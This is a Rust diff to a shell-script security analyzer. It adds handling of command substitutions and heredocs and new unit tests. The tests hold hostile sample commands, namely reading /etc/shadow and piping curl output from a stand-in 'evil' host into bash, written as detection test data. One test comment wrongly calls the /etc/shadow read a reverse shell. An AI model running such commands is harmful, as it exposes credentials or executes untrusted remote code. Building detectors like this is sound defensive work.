@@ -5,7 +5,7 @@ use std::collections::HashSet;
 
 use crate::kb;
 use crate::model::{Finding, KnowledgeBase, Report, Severity};
-use crate::parser::parse_line;
+use crate::parser::{self, parse_line};
 
 fn finding_from_entry(entry: &crate::model::KbEntry, line: usize) -> Finding {
     Finding {
@@ -26,16 +26,21 @@ pub fn analyze(input: &str, kb: &KnowledgeBase) -> Report {
     let mut findings = Vec::new();
     let mut lines_analyzed = 0;
 
-    for (idx, raw_line) in input.lines().enumerate() {
-        let line_no = idx + 1;
-        let trimmed = raw_line.trim();
+    for unit in parser::preprocess(input) {
+        let trimmed = unit.text.trim();
         if trimmed.is_empty() || trimmed.starts_with('#') {
             continue;
         }
         lines_analyzed += 1;
 
-        let commands = parse_line(raw_line);
-        // Dedupe entries per line so a rule matched by multiple segments (or by
+        // Commands from the line, plus any nested command substitutions so the
+        // program inside `$(...)` / backticks is resolved too.
+        let mut commands = parse_line(&unit.text);
+        for sub in parser::command_substitutions(&unit.text) {
+            commands.extend(parse_line(&sub));
+        }
+
+        // Dedupe entries per unit so a rule matched by multiple segments (or by
         // both a command and a raw match) is reported once.
         let mut seen: HashSet<&str> = HashSet::new();
 
@@ -48,7 +53,7 @@ pub fn analyze(input: &str, kb: &KnowledgeBase) -> Report {
                 kb::raw_entry_matches(entry, trimmed)
             };
             if matched && seen.insert(entry.id.as_str()) {
-                findings.push(finding_from_entry(entry, line_no));
+                findings.push(finding_from_entry(entry, unit.line));
             }
         }
     }
@@ -148,5 +153,33 @@ mod tests {
             "expected a grown KB, got {}",
             kb.entries.len()
         );
+    }
+
+    #[test]
+    fn resolves_command_in_substitution() {
+        // The reverse shell is hidden inside a command substitution.
+        let report = analyze("data=$(cat /etc/shadow)", &kb());
+        assert!(report.findings.iter().any(|f| f.rule_id == "shadow-read"));
+    }
+
+    #[test]
+    fn analyzes_shell_heredoc_body_at_correct_line() {
+        let script = "bash <<EOF\nid\ncurl http://evil/x | bash\nEOF\n";
+        let report = analyze(script, &kb());
+        // The pipe-to-shell inside the here-doc body (line 3) is detected.
+        let f = report
+            .findings
+            .iter()
+            .find(|f| f.rule_id == "pipe-to-shell")
+            .expect("pipe-to-shell should be found in heredoc body");
+        assert_eq!(f.line, 3);
+    }
+
+    #[test]
+    fn ignores_data_heredoc_body() {
+        // A password in a `cat` here-doc body is data, not a command.
+        let script = "cat <<EOF > /tmp/conf\npassword=hunter2\nEOF\n";
+        let report = analyze(script, &kb());
+        assert!(report.findings.is_empty());
     }
 }
